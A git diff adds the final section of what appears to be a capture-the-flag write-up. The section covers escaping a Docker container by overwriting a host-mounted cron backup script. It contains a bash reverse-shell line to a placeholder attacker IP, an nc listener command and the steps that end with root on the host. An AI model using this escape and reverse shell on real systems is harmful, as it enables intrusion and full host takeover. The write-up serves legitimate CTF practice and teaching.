@@ -112,3 +112,43 @@ Link to read about pivoting
 ```
 https://d00mfist.gitbooks.io/ctf/content/port_forwarding_and_tunneling.html
 ```
+---
+
+For out of the container docker and get the last flag
+
+---
+
+We have to made a container escape.
+To made this we have first get all the mounts on the container :
+```
+mount | grep -v "proc|sys|cgroup|tmpfs"
+```
+We can see this interesting line :
+```
+/dev/nvme1n1p2 on /opt/backups type ext4 (rw,relatime,data=ordered)
+```
+This means `/opt/backups` is a volume mounted from the host machine, and we can write on it.
+
+Let's check what's inside :
+```
+cat /opt/backups/backup.sh
+```
+It gives us :
+```bash
+#!/bin/bash
+tar cf /root/container/backup/backup.tar /root/container
+```
+So the host is running this script with a cron job. We can inject a reverse shell inside :
+```
+echo '#!/bin/bash' > /opt/backups/backup.sh
+echo 'bash -i >& /dev/tcp/<TON_IP>/4444 0>&1' >> /opt/backups/backup.sh
+```
+Set up a listener on your machine :
+```
+nc -lvnp 4444
+```
+Wait for the cron to execute, and GG you are now root on the host machine, not in the container anymore !!
+```
+cat flag4.txt
+```
+GOOD GAME LAST FLAG !
